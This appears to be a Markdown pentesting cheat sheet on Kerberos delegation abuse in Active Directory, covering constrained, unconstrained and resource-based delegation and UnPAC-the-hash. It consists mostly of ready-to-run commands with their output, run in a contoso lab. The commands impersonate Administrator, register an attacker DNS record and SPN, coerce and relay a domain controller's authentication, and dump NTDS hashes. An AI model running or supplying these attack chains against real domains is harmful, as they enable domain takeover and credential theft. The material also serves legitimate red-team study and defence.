# S4U2 and Delegation

## KCD

### Execution

With protocol transition ("Use any authentication protocol")

```bash
impacket-getST \
-spn 'HOST/WIN-SRV01' \
-impersonate 'Administrator' \
-dc-ip 192.168.1.12 \
-hashes ':d363d91fda8ff73478c94b2b7422ab63' \
'sales.contoso.lab/intrasvc'
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [-] CCache file is not found. Skipping...
# [*] Getting TGT for user
# [*] Impersonating Administrator
# [*] Requesting S4U2self
# [*] Requesting S4U2Proxy
# [*] Saving ticket in Administrator@HOST_WIN-SRV01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache
```

Without protocol transition: you may perform an RBCD against the account with `ms-DS-Allowed-To-Delegate-To` attribute (e.g. via `impacket-getST`) in order to get a forwardable ST impersonating a desired principal and then pass it within the KCD TGS-REQ additional-ticket property (e.g. `impacket-getST -additional-ticket`)

## KUD

### Execution

```bash
# add attacker.sales.contoso.lab - 192.168.1.145 entry to win-dc02
dnstool -u 'sales.contoso.lab\intrasvc' -p '4dmD4v1D' \
-r attacker.sales.contoso.lab \
-d 192.168.1.145 --action add \
win-dc02.sales.contoso.lab
# [-] Connecting to host...
# [-] Binding to host
# [+] Bind OK
# [-] Adding new record
# [+] LDAP operation completed successfully

addspn -u 'sales.contoso.lab\lmodifr' -p '94Dk5@!nDM' \
-s HOST/attacker.sales.contoso.lab \
-t intrasvc \
win-dc02.sales.contoso.lab
# [-] Connecting to host...
# [-] Binding to host
# [+] Bind OK
# [+] Found modification target
# [+] SPN Modified successfully

printerbug 'sales.contoso.org'/'intrasvc':'4dmD4v1D'@'win-dc02.sales.contoso.lab' 'attacker.sales.contoso.lab'

krbrelayx --krbsalt 'SALESintrasvc' --krbpass '4dmD4v1D'
# [*] Protocol Client LDAP loaded..
# ...
# [*] Setting up DNS Server
# [*] Servers started, waiting for connections
# [*] SMBD: Received connection from 192.168.1.12
# [*] Got ticket for WIN-DC02$@SALES.CONTOSO.LAB [krbtgt@SALES.CONTOSO.LAB]
# [*] Saving ticket in WIN-DC02$@SALES.CONTOSO.LAB_krbtgt@SALES.CONTOSO.LAB.ccache
# ...

export KRB5CCNAME='WIN-DC02$@SALES.CONTOSO.LAB_krbtgt@SALES.CONTOSO.LAB.ccache'

impacket-secretsdump -k -no-pass win-dc02.sales.contoso.lab
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:cca26f1ea98625a85443f8b30702805e:::
# ...
```

## RBCD

### Execution

Edit msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
### e.g. in impacket ldap_shell
# set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
set_rbcd WIN-NUU0DPB1BVC$ TestAlpha
```


Add SPN to current user

```bash
# -u == account we're using
# -t == target account
# 192.168.68.64 == DC IP
python3 utils/krbrelayx/addspn.py \
-u 'CONTOSO\TestAcc' \
-p 'win2016-cli-P@$swd' \
-s 'host/testspn.contoso.org' \
-t 'TestAlpha' 192.168.68.64
```


Get a TGS for any user to a target service

```bash
impacket-getST \
-spn 'HOST/WIN-NUU0DPB1BVC' \
-impersonate 'Administrator' \
-dc-ip 192.168.68.64 'contoso.org/TestAlpha:win10-gui-P@$swd'
```

### Prerequisites

- victim - account which privileges we'd relay (e.g. DA)
- desired service - service account to which we'd relay victim's auth
- infected account, either fake (newly created specifically for the attack) or owned by an attacker

1. Desired service account should have an `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute featuring a infected account's SPN. (You should be able to create fake machine account (if you do NOT already own one!) and modify target service's attributes (if it DOESN'T feature your owned account already!)) (not default)
2. The victim should be not in "Protected Users" group. (default)
3. The victim should not have an "Account is sensitive and cannot be delegated" attribute set. (default)
4. Infected account should have an `TRUSTED_TO_AUTH_FOR_DELEGATION` flag featured in it's userAccountControl attribute
5. Infected account (that is set inside of `msDS-AllowedToActOnBehalfOfOtherIdentity` of a target service) should have an SPN (machine accounts BY DEFAULT have **GenericWrite** to themselves, so if you compromise a machineaccount you can write an SPN to it) (user accounts BY DEFAULT **DO NOT** have **GenericWrite** to themselves, so if you compromise a useraccount you **can NOT** write an SPN to it, it should **already** have an SPN) (default)
6. If relay to LDAP, LDAP singing should be OFF (default)

## UnPAC-the-Hash (S4U2Self+U2U abuse)

### Execution

```bash
# request PFX for the user
certipy-ad req -u alice@sales.contoso.lab -p '1AM4l1c3!?' -dc-ip 192.168.1.12 -target win-srv01.sales.contoso.lab -ca sales-WIN-SRV01-CA-1 -template User
# Certipy v5.0.3 - by Oliver Lyak (ly4k)
# 
# [*] Requesting certificate via RPC
# [*] Request ID is 4
# [*] Successfully requested certificate
# [*] Got certificate with UPN 'alice@sales.contoso.lab'
# [*] Certificate has no object SID
# [*] Try using -sid to set the object SID or see the wiki for more details
# [*] Saving certificate and private key to 'alice.pfx'
# [*] Wrote certificate and private key to 'alice.pfx'

certipy-ad auth -pfx alice.pfx -dc-ip 192.168.1.12
# Certipy v5.0.3 - by Oliver Lyak (ly4k)
# 
# [*] Certificate identities:
# [*]     SAN UPN: 'alice@sales.contoso.lab'
# [*] Using principal: 'alice@sales.contoso.lab'
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saving credential cache to 'alice.ccache'
# [*] Wrote credential cache to 'alice.ccache'
# [*] Trying to retrieve NT hash for 'alice'
# [*] Got hash for 'alice@sales.contoso.lab': aad3b435b51404eeaad3b435b51404ee:8dd42e035069b0a62b699cd638ada4ed
```


```bash
#PKINITtools https://github.com/dirkjanm/PKINITtools
python3 PKINITtools/gettgtpkinit.py -cert-pfx ./alice.pfx "sales.contoso.lab/alice" alice1.ccache -dc-ip 192.168.1.12
# 23:21:13,787 minikerberos INFO     Loading certificate and key from file
# 23:21:13,857 minikerberos INFO     Requesting TGT
# 23:21:13,865 minikerberos INFO     AS-REP encryption key (you might need this later):
# 23:21:13,865 minikerberos INFO     692e3b1bfe6e5980a2ca0b0c2994ccd6805aff0a1650654e7954ec0664de82ae
# 23:21:13,867 minikerberos INFO     Saved TGT to file

export KRB5CCNAME="alice1.ccache"
python3 PKINITtools/getnthash.py -key '692e3b1bfe6e5980a2ca0b0c2994ccd6805aff0a1650654e7954ec0664de82ae' 'sales.contoso.lab'/'alice' -dc-ip 192.168.1.12
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [*] Using TGT from cache
# [*] Requesting ticket to self with PAC
# Recovered NT Hash
# 8dd42e035069b0a62b699cd638ada4ed
```
